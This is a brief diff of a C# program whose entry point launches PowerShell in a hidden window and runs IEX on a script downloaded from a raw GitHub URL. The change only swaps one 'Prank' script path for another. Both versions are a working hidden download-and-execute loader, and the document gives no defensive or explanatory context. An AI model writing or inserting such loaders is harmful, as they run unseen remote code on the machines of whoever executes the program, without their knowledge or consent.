@@ -5,7 +5,7 @@ using System.Diagnostics;
         static void Main() {
             Process.Start("Powershell.exe",
             "-windowstyle hidden",
-            "-c IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/gfsmithak/grant-test/master/C%20Practice/ClipboardPrank')");
+            "-c IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/gfsmithak/grant-test/master/Temp/Prank')");
             }
          }
 
